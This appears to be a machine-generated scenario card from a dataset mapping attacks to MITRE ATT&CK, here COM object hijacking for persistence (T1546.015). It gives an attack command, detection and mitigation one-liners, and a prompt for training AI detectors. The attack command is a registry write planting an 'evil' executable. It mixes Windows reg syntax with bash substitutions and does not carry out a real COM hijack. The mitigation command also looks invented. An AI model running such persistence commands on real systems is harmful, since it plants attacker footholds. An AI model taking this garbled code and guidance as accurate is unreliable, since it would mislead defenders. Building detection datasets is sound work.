---
type: campaign
scenario_id: 165
tactic: Persistence
technique: "T1546.015: Component Object Model Hijacking"
technique_id: T1546.015
tags: [campaign, lotl, persistence]
---

# Hijacking COM object via registry for persistence.

## Threat Description
Hijacking COM object via registry for persistence.

## Attack Command
```
reg add HKCU\Software\Classes\CLSID\{$(uuidgen)} /v AppID /t REG_SZ /d "C:\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)"
```

## Detection Logic
Monitor COM hijacking: `reg query HKCU\Software\Classes\CLSID | findstr AppID`; Event ID 4657.

## Mitigation
Restrict COM writes: `regini -h deny HKCU\Software\Classes\CLSID`; Audit COM changes: `reg query HKCR\CLSID`.

## AI Training Prompt
Train AI to detect COM hijacking and suggest registry protections.

## References
- MITRE ATT&CK T1546.015: https://attack.mitre.org/techniques/T1546/015/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
